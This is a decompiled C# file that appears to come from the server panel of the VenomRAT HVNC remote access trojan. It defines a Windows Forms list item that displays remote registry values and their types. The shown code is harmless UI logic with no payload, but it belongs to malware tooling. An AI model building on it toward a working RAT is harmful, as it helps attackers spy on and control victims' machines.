using System.Windows.Forms;

namespace VenomRAT_HVNC.Server.Helper
{
    // Token: 0x02000059 RID: 89
    public class RegistryValueLstItem : ListViewItem
    {
        // Token: 0x17000080 RID: 128
        // (get) Token: 0x060002E3 RID: 739 RVA: 0x0001E321 File Offset: 0x0001E321
        // (set) Token: 0x060002E4 RID: 740 RVA: 0x0001E329 File Offset: 0x0001E329
        private string _type { get; set; }

        // Token: 0x17000081 RID: 129
        // (get) Token: 0x060002E5 RID: 741 RVA: 0x0001E332 File Offset: 0x0001E332
        // (set) Token: 0x060002E6 RID: 742 RVA: 0x0001E33A File Offset: 0x0001E33A
        private string _data { get; set; }

        // Token: 0x17000082 RID: 130
        // (get) Token: 0x060002E7 RID: 743 RVA: 0x0001E343 File Offset: 0x0001E343
        // (set) Token: 0x060002E8 RID: 744 RVA: 0x0001E34B File Offset: 0x0001E34B
        public string RegName
        {
            get
            {
                return base.Name;
            }
            set
            {
                base.Name = value;
                base.Text = RegValueHelper.GetName(value);
            }
        }

        // Token: 0x17000083 RID: 131
        // (get) Token: 0x060002E9 RID: 745 RVA: 0x0001E360 File Offset: 0x0001E360
        // (set) Token: 0x060002EA RID: 746 RVA: 0x0001E368 File Offset: 0x0001E368
        public string Type
        {
            get
            {
                return this._type;
            }
            set
            {
                this._type = value;
                if (base.SubItems.Count < 2)
                {
                    base.SubItems.Add(this._type);
                }
                else
                {
                    base.SubItems[1].Text = this._type;
                }
                base.ImageIndex = this.GetRegistryValueImgIndex(this._type);
            }
        }

        // Token: 0x17000084 RID: 132
        // (get) Token: 0x060002EB RID: 747 RVA: 0x0001E3C7 File Offset: 0x0001E3C7
        // (set) Token: 0x060002EC RID: 748 RVA: 0x0001E3D0 File Offset: 0x0001E3D0
        public string Data
        {
            get
            {
                return this._data;
            }
            set
            {
                this._data = value;
                if (base.SubItems.Count < 3)
                {
                    base.SubItems.Add(this._data);
                    return;
                }
                base.SubItems[2].Text = this._data;
            }
        }

        // Token: 0x060002ED RID: 749 RVA: 0x0001E41C File Offset: 0x0001E41C
        public RegistryValueLstItem(RegistrySeeker.RegValueData value)
        {
            this.RegName = value.Name;
            this.Type = value.Kind.RegistryTypeToString();
            this.Data = RegValueHelper.RegistryValueToString(value);
        }

        // Token: 0x060002EE RID: 750 RVA: 0x0001E450 File Offset: 0x0001E450
        private int GetRegistryValueImgIndex(string type)
        {
            if (!(type == "REG_MULTI_SZ") && !(type == "REG_SZ") && !(type == "REG_EXPAND_SZ"))
            {
                if (!(type == "REG_BINARY") && !(type == "REG_DWORD") && !(type == "REG_QWORD"))
                {
                }
                return 1;
            }
            return 0;
        }
    }
}